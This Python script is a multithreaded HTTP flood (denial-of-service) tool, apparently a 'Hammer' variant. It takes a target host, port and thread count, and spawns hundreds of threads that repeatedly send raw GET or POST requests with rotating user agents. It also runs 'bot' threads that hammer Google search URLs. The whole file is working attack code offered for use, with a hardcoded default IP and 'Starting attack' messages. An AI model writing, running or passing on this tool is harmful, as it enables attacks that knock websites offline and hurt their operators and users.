from queue import Queue
from optparse import OptionParser
import time
import sys
import socket
import threading
import logging
import urllib.request
import random
from colorama import Fore, Style, init

# GET / POST
def sedot_parameters():
    global ip, host, port, thr, item, referer, uri, path, method, isbot, data_post
    ip = "118.98.73.214" 
    host = "www.google.com"
    port = 80
    thr = 500
    path = "/"                 
    uri = "/"                                   
    method = "GET"                                
    data_post = ""                               
    isbot = 0

    # OPTIONS
    optp = OptionParser(add_help_option=False, epilog="Hammers")
    optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel", const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s", "--host", dest="host", help="attack to server host --host www.target.com")
    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
    optp.add_option("-t", "--turbo", type="int", dest="turbo", help="default 200 -t 200")
    optp.add_option("-a", "--path", dest="path", help="default /  -a /db.php")
    optp.add_option("-u", "--uri", dest="uri", help="default /  -u /index.jsp")
    optp.add_option("-m", "--method", dest="method", help="default GET  -m GET")
    optp.add_option("-d", "--data", dest="data", help="default  -d user=test&pass=test")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
    if opts.help:
        usage()
    if opts.host is None:
        usage()
    else:
        host = opts.host
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.turbo is None:
        thr = 200
    else:
        thr = opts.turbo
    if opts.path is None:
        path = "/"
    else:
        path = opts.path
    if opts.uri is None:
        uri = "/"
    else:
        uri = opts.uri
    if opts.method is None:
        method = "GET"
    else:
        method = opts.method
    if opts.data is None:
        data_post = ""
    else:
        data_post = opts.data

# USAGE
def usage():
    print(Fore.RED + r'''
vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv        
v ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ v
v ^           ___       ________      ___    ___ _______   ________          ________              ^ v
v ^          |\  \     |\   __  \    |\  \  /  /|\  ___ \ |\   __  \        |\_____  \             ^ v 
v ^          \ \  \    \ \  \|\  \   \ \  \/  / | \   __/|\ \  \|\  \        \|___/  /|            ^ v
v ^           \ \  \    \ \   __  \   \ \    / / \ \  \_|/_\ \   _  _\           /  / /            ^ v 
v ^            \ \  \____\ \  \ \  \   \/  /  /   \ \  \_|\ \ \  \\  \|         /  / /             ^ v
v ^             \ \_______\ \__\ \__\__/  / /      \ \_______\ \__\\ _\        /__/ /              ^ v 
v ^              \|_______|\|__|\|__|\___/ /        \|_______|\|__|\|__|       |__|/               ^ v 
v ^                                 \|___|/                                                        ^ v
v ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ v                                                                  
vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv                                                                         
    ________________________________________________________________________________________________
    | -s or --host = "www.google.com"                                                              |
    | -p or --port = 80 > 80 (http) or 443 (htttps)                                                |
    | -t or --turbo  = 200 > default 200                                                           |
    | -a or --path = "/" > specific attack                                                         |
    | -u or --uri = "/" > location/page where the website won't redirect anymore, e.g.: /index.jsp |
    | -m or --method = "GET" > GET / POST                                                          |
    | -d or --data = "" > used only for method = POST, e.g.: user=test&pass=test                   |
    ------------------------------------------------------------------------------------------------  
    ''')
    sys.exit()

# BOTS
def my_bots():
    global bots
    bots = [] 
    bot1 = "https://www.google.com/?q="
    bots.append(bot1)
    return bots

def user_agent():
    global uagent
    uagent = []
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    return uagent

def bot_hammering(url):
    try:
        while True:
            sys.stdout.write("Bot>>fire . . .")
            sys.stdout.write('\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b')
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
            time.sleep(.1)
    except Exception as e:
        print(Fore.RED + f"Error in bot_hammering: {e}")
        time.sleep(.1)

def down_it(item):
    try:
        while True:
            if port == 80:
                referer = "http://"
            elif port == 443:
                referer = "https://"

            if method == "GET":
                packet = str("GET " + path + " HTTP/1.1\nReferer: " + referer + host + uri + "\nHost: " + host + "\nUser-Agent: " + random.choice(uagent) + "\n\n").encode('utf-8')
            elif method == "POST":
                if not data_post:
                    print(Fore.RED + "Error: data_post cannot be empty for POST requests.")
                    continue
                packet = str("POST " + path + " HTTP/1.1\nReferer: " + referer + host + uri + "\nHost: " + host + "\nUser-Agent: " + random.choice(uagent) + "\n" + data_post + "\n\n").encode('utf-8')
            else:
                print(Fore.RED + "Error: Unsupported method.")
                continue

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                sys.stdout.write("Attacking . . .")
                sys.stdout.write('\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b')
            else:
                s.shutdown(1)
                print(Fore.YELLOW + "shut<->down")
            time.sleep(.1)
    except socket.error as e:
        print(Fore.RED + f"No connection! Server may be down. Error: {e}")
        time.sleep(.1)

def dos():
    while True:
        item = q.get()
        url = random.choice(bots) + "t" + str(random.randint(0, 1000))
        threading.Thread(target=bot_hammering, args=(url,)).start()

def dos2():
    while True:
        item = w.get()
        down_it(item)

def main():
    sedot_parameters()
    user_agent()
    my_bots()
    
    print(Fore.GREEN + f"Starting attack on {host} on port {port}...")
    for i in range(thr):
        t = threading.Thread(target=dos)
        t.daemon = True
        t.start()
        
    for i in range(thr):
        t2 = threading.Thread(target=dos2)
        t2.daemon = True
        t2.start()
        
    # Filling the queues
    while True:
        if not q.full():
            q.put("1")
        if not w.full():
            w.put("2")
        time.sleep(0.1)

if __name__ == '__main__':
    q = Queue(maxsize=1000)
    w = Queue(maxsize=1000)
    main()
